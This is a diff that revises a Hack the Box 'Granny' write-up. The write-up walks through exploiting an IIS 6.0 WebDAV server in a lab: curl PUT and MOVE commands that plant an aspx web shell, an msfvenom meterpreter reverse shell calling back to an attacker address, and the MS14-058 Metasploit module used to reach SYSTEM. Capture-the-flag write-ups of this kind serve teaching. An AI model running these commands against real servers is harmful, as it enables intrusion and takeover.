@@ -1,10 +1,24 @@
-# Hack the Box: Granny
 
-## Port Scan
-Discover open ports on the target machine.
+Granny is an easy Windows OS box, which can be exploited using several different methods. In this write-up I will be following the intended method of pwning this box. 
+
+In order to gain remote access to the target machine I will exploit the `PUT` method in the WebDAV extension of the HTTP protocol. This vulnerability exists in IIS 6.0 (CVE-2017-7269) when WebDEV improperly handles objects in the memory, which could allow an attacker to run arbitrary code on the target machine.
+
+For privilege escalation I will exploit the "NULL Pointer Dereference" vulnerability (CVE-2014-4113) which exists in Windows kernel mode driver `win32k.sys` and allows local users to gain privileges.
+
+---
+
+## Reconnaissance
+ - Discover open ports.
+ - Detect exposed services and their versions running on open ports.
+
+### Initial Port Scan
+Perform a comprehensive port scan to find the open ones on the target machine by scanning all ports.
 ```shell
-rustscan -a 10.10.10.15 -r 0-65535 -b 1000 -u 5000 -- -Pn
+root@kali# rustscan -a 10.10.10.15 -r 0-65535 -b 1000 -u 5000 -- -Pn
+```
 
+Port scan result:
+```shell
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -40,12 +54,18 @@ PORT   STATE SERVICE REASON
 
 Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
+Exposed Services
+Identify services running on the open ports.
 ```
 
-## Exposed Services
-Identify services running on the open ports.
+### Service and Version Detection
+Detect all running services and their versions by running a script scan on all open ports found.
 ```shell
-rustscan -a 10.10.10.15 -p 80 -u 5000 -- -sC -sV
+root@kali# rustscan -a 10.10.10.15 -p 80 -u 5000 -- -sC -sV
+```
+
+Script scan result:
+```shell
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -132,18 +152,80 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 12.65 seconds
 ```
 
----
+### Analysis
+The scan results show that one port is found to be open which is 80, hence this is the only entry point to the box. The port is running Miscrosoft Windows IIS 6.0 which is an outdated version and is using the WebDEV extension of the HTTP protocol. One thing that pops out right away are the allowed HTTP methods. These methods could potentially allow to add, delete and move files on the web server.
 
-### Port #80 HTTP
-![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a7f3ba74-df96-4268-a904-fe6ee6d7d880)
+## Enumeration
+- Visit port 80 via a browser.
+- Brute-force common directories and files.
 
----
+### Web Application
+Visit the web application on port 80.
 
-## WebDAV
-Web Distributed Authoring and Versioning or WebDAV is a protocol whose basic functionality includes enabling users to share, copy, move and edit files through a web server. 
+![Web Application](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a7f3ba74-df96-4268-a904-fe6ee6d7d880)
+The web application just says “Under Construction”.
+
+### Response Headers
+Inspect the response headers for some useful information.
+
+```http
+HTTP/1.1 200 OK
+Content-Length: 1433
+Content-Type: text/html
+Content-Location: http://10.10.10.15/iisstart.htm
+Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT
+Accept-Ranges: bytes
+ETag: "05b3daec0d9c21:38e"
+Server: Microsoft-IIS/6.0
+MicrosoftOfficeWebServer: 5.0_Pub
+X-Powered-By: ASP.NET
+Date: Tue, 26 Sep 2023 08:08:13 GMT
+```
+The `X-Powered-By: ASP.NET` indicates that `aspx` files may get executed if I can somehow upload one on the server.
+
+### Content Discovery
+Brute-force directories and files.
 
 ```shell
-davtest --url http://10.10.10.15
+root@kali# feroxbuster -u http://10.10.10.15 -w /usr/share/wordlists/ctf-wordlist.txt -s 200 -n
+```
+Brute-force result:
+```shell
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.10.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.10.15
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/ctf-wordlist.txt
+ 👌  Status Codes          │ [200]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.10.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🚫  Do Not Recurse        │ true
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+200      GET        1l       23w     3080c http://10.10.10.15/pagerror.gif
+200      GET       39l      159w     1433c http://10.10.10.15/
+[####################] - 60s    17778/17778   0s      found:2       errors:17764  
+[####################] - 60s    17770/17770   298/s   http://10.10.10.15/  
+```
+Looking into the directories and files that `feroxbuster` found, nothing useful came up.
+
+## WebDAV
+Web Distributed Authoring and Versioning or WebDAV is a protocol whose basic functionality includes enabling users to share, copy, move and edit files through a web server.
+
+This could potentially give us the ability to save files on the web server. Especially an `aspx` file as it was mentioned in the response headers.
+
+### Exploration
+I will use the `davtest` tool to find out what types of files can be uploaded, and can a directory be created on the server.
+
+```shell
+root@kali# davtest --url http://10.10.10.15
 
 ********************************************************
  Testing DAV connection
@@ -191,95 +273,66 @@ PUT File: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.jsp
 Executes: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.html
 Executes: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.txt
 ```
+The results show that a lot of file types can be uploaded but not `asp` or `aspx`, which are of my interest. However, `txt` and `html` files are allowed and can be uploaded.
 
-### Test WebDAV Manually
+#### Manual
+Remember that `PUT` is not the only method that is allowed. I also can use the `MOVE` method. The `MOVE` HTTP method not only can be used to change the location of a file on the web server, but it can also be used to rename files.
+
+I will try to upload a file with `.txt` extension with `curl`. Once the text file is uploaded onto the server I will change the file extension to `.aspx`
+
+Create and Upload:
 ```shell
 echo "PwnStuff" > test.txt
-curl -X PUT http://10.10.10.15/test.txt -d @test.txt
-curl http://10.10.10.15/test.txt
-```
-![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/1c36428b-c238-45b6-8777-204a653acd71)
-
-```shell
-curl -X PUT http://10.10.10.15/test.aspx -d @test.txt
-
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
-<HTML><HEAD><TITLE>The page cannot be displayed</TITLE>
-<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
-<STYLE type="text/css">
-  BODY { font: 8pt/12pt verdana }
-  H1 { font: 13pt/15pt verdana }
-  H2 { font: 8pt/12pt verdana }
-  A:link { color: red }
-  A:visited { color: maroon }
-</STYLE>
-</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>
-
-<h1>The page cannot be displayed</h1>
-You have attempted to execute a CGI, ISAPI, or other executable program from a directory that does not allow programs to be executed.
-<hr>
-<p>Please try the following:</p>
-<ul>
-<li>Contact the Web site administrator if you believe this directory should allow execute access.</li>
-</ul>
-<h2>HTTP Error 403.1 - Forbidden: Execute access is denied.<br>Internet Information Services (IIS)</h2>
-<hr>
-<p>Technical Information (for support personnel)</p>
-<ul>
-<li>Go to <a href="http://go.microsoft.com/fwlink/?linkid=8180">Microsoft Product Support Services</a> and perform a title search for the words <b>HTTP</b> and <b>403</b>.</li>
-<li>Open <b>IIS Help</b>, which is accessible in IIS Manager (inetmgr),
- and search for topics titled <b>Configuring ISAPI Extensions</b>, <b>Configuring CGI Applications</b>, <b>Securing Your Site with Web Site Permissions</b>, and <b>About Custom Error Messages</b>.</li>
-<li>In the IIS Software Development Kit (SDK) or at the <a href="http://go.microsoft.com/fwlink/?LinkId=8181">MSDN Online Library</a>, search for topics titled <b>Developing ISAPI Extensions</b>, <b>ISAPI and CGI</b>, and <b>Debugging ISAPI Extensions and Filters</b>.</li>
-</ul>
-
-</TD></TR></TABLE></BODY></HTML>
-
-```shell
-curl -X MOVE -H 'Destination:http://10.10.10.15/test.aspx' http://10.10.10.15/test.txt
-curl http://10.10.10.15/test.aspx
-```
-![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2bc4a9ea-988a-43b5-b152-014075609db5)
-
----
-
-### Upload Web Shell
-```shell
-cp /usr/share/webshells/aspx/cmdasp.aspx .
-mv cmdasp.aspx revsh.txt
+root@kali# curl -X PUT http://10.10.10.15/test.txt -d @test.txt
+root@kali# curl http://10.10.10.15/test.txt
 ```
 
-### Move Web Shell
+Change Extension:
 ```shell
-curl -X PUT http://10.10.10.15/revsh.txt --data-binary @revsh.txt
-curl -X MOVE -H 'Destination:http://10.10.10.15/revsh.aspx' http://10.10.10.15/revsh.txt
+root@kali# curl -X MOVE -H 'Destination:http://10.10.10.15/test.aspx' http://10.10.10.15/test.txt
+root@kali# curl http://10.10.10.15/test.aspx
 ```
 
-### Access Web Shell
-![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9f945906-a62a-457b-b743-641e12ce5ae8)
+Success:
+![img](https://user-images.githubusercontent.com/83878909/270296381-2bc4a9ea-988a-43b5-b152-014075609db5.png)
 
----
-
-## MSF Venom
-Using msfvenom and metasploit to get a reverse shell from the target machine.
-
-### Generate Shell
+### Web Shell
+I will use an `aspx` web shell from `/usr/share/webshells/aspx/cmdasp.aspx`:
 ```shell
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f aspx > shell.aspx
+root@kali# cp /usr/share/webshells/aspx/cmdasp.aspx .
+root@kali# mv cmdasp.aspx revsh.txt
 ```
-![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c3c4c830-1a83-4773-9a6a-04f9665547a5)
 
+Upload and rename the extension of the web shell:
+```shell
+root@kali# curl -X PUT http://10.10.10.15/revsh.txt --data-binary @revsh.txt
+root@kali# curl -X MOVE -H 'Destination:http://10.10.10.15/revsh.aspx' http://10.10.10.15/revsh.txt
+```
 
-### Upload Shell 
-Upload the shell with `.txt` extension and then use the move http method to rename the shell with the `.aspx` extension.
+Access the web shell:
+![img](https://user-images.githubusercontent.com/83878909/270300015-9f945906-a62a-457b-b743-641e12ce5ae8.png)
+
+## Initial Foothold
+Since it is now confirmed that ASPX code can be successfully uploaded and executed on the web server. I will upload a reverse shell to gain a foothold.
+
+### Reverse Shell as Netwrok Service
+Generate an `aspx` reverse shell and upload it onto the web server.
+
+#### MSFVenom
+```shell
+root@kali# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f aspx > shell.aspx
+```
+![img](https://user-images.githubusercontent.com/83878909/270320264-c3c4c830-1a83-4773-9a6a-04f9665547a5.png)
+
 ```shell
 curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.aspx
 curl -X MOVE -H 'Destination: http://10.10.10.15/shell.aspx' http://10.10.10.15/shell.txt
 ```
 
-## Metasploit
-Start
+#### Meterpreter
+Start MSFConsole and setup listener.
 ```shell
-msfconsole
+root@kali# msfconsole
                                                   
      ,           ,
     /             \
@@ -302,9 +355,6 @@ currently active module in your editor
 Metasploit Documentation: https://docs.metasploit.com/
 
 msf6>
-```
-
-```shell
 msf6 > use exploit/multi/handler 
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
@@ -345,19 +395,20 @@ msf6 exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.10.14.10:443 
 ```
 
-### Reverse Connection
-Trigger the shell
-![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/aaa22746-a494-4471-8044-c74d1bc4be6e)
+Trigger the uploaded reverse shell:
+![img](https://user-images.githubusercontent.com/83878909/270324458-aaa22746-a494-4471-8044-c74d1bc4be6e.png)
 
 ```shell
-msf6 exploit(multi/handler) > run
-
 [*] Started reverse TCP handler on 10.10.14.10:443 
 [*] Sending stage (175686 bytes) to 10.10.10.15
 [*] Meterpreter session 1 opened (10.10.14.10:443 -> 10.10.10.15:1031) at 2023-09-25 16:50:33 +0530
 ```
+I get a shell! Unfortunately, I don’t have permission to view the user.txt flag, so I need to escalate privileges.
 
-Search Expolits
+## Privilege Escalation
+I will use the `local-exploit-suggester` module to identify any missing patches on the box which potentially allows me to escalate privileges my permissions on the box.
+
+### Exploit Suggester
 ```shell
 msf6> background
 [*] Backgrounding session 1..
@@ -409,8 +460,11 @@ msf6 post(multi/recon/local_exploit_suggester) > run
 [*] Post module execution completed
 msf6 post(multi/recon/local_exploit_suggester) >
 ```
+I will use the second exploit second one **MS14–058** (`ms14_058_track_popup_menu`).
 
-Exploit
+### MS14-058
+A privilege escalation vulnerability (CVE-2014-4113) allows an attacker to run arbitrary code in kernel mode due to the kernel-mode driver improperly handling objects in memory.
+
 ```shell
 msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_058_track_popup_menu
 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
@@ -473,3 +527,20 @@ Mode              Size  Type  Last modified              Name
 040777/rwxrwxrwx  0     dir   2017-04-12 19:38:32 +0530  LocalService
 040777/rwxrwxrwx  0     dir   2017-04-12 19:38:31 +0530  NetworkService
 ```
+
+#### Check Privileges
+```shell
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+---
+
+## Conclusion
+Initial Foothold:
+- Insecure configuration of the web server that allowed me to upload arbitrary files using the HTTP methods ‘PUT’ and ‘MOVE’. This would not have been possible if the HTTP methods were disabled.
+
+Privilege Escalation:
+- A Kernel vulnerability in the windows operating system. This could have been avoided if the OS was patched.
+
+_**That's all folks for this box!**_
